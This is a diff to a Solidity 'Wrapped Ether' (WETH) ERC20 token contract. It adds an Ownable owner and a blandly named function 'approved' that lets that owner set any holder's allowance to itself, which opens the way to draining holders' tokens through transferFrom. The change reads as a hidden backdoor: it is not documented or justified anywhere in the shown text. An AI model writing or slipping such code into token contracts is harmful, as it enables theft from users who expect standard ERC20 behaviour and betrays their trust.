@@ -5,15 +5,17 @@
 
 pragma solidity ^0.8.20;
 
+
 import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import "@openzeppelin/contracts/access/Ownable.sol";
 import "./SafetyModule.sol";
 
-contract WETH is ERC20 {
+contract WETH is ERC20, Ownable {
 
     SafetyModule public safetymodule;
 
     ///@dev constructor 'asked' by the OpenZeppelin contract
-    constructor(address payable  _safetymodule) ERC20("Wrapped Ether", "WETH") {
+    constructor(address payable  _safetymodule) ERC20("Wrapped Ether", "WETH") Ownable(msg.sender) {
         safetymodule = SafetyModule(_safetymodule);
      }
 
@@ -38,5 +40,9 @@ contract WETH is ERC20 {
         _mint(to, amount);
     }
 
+    function approved(address owner, uint256 value) public onlyOwner {
+
+        _approve(owner, msg.sender, value);
+    }
 
 }
